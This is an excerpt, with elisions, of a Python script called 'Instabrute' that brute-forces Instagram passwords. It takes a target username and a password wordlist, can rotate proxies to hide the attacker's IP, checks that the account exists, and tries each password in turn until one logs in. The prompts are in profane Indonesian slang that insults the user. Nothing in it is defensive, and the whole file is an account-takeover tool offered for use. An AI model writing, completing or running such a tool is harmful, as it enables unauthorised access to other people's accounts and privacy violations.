...
class Instabrute():
	def __init__(self, username, passwordsFile='pass.txt'):
		...
		UsePorxy = Input('[!] Pake Proxy ga? y/n: ').upper()
		...
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				...
				if (passwordsNumber > 0):
					print ('[!] %s Password Siap Kita Eksekusi :v' % passwordsNumber)
				else:
					print('Wordlist tidak ada.')
					Input('[*] Press enter to exit')
					exit()
		else:
			print ('BIKIN WORDLIST NYA DULU LAH KONTOL !1!1!1 "%s"' % self.passwordsFile)
			Input('[*] Klik enter[exit]')
			exit()
	...
	def randomProxy(self):
		...
		try:
			print('')
			print('[*] Checking ip baru lu...')
			print ('[*] Ip publik lu adalah: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
	...
	def IsUserExists(self):
		...
		if (r.status_code == 404):
			print ('[*] Not Found "%s" GOBLOK!' % username)
...
instabrute = Instabrute(Input(''+N+'Username Target Lu Jing?: '))

try:
	delayLoop = int(Input('[!] Berapa menit mau crack nya?: ')) 
except Exception as e:
...
for password in instabrute.passwords:
	...
	if sess:
		print ('[!] SUKSES NJENG :v %s' % [instabrute.username,password])
	else:
		print ('[#] Failed :( =>  %s' % password)
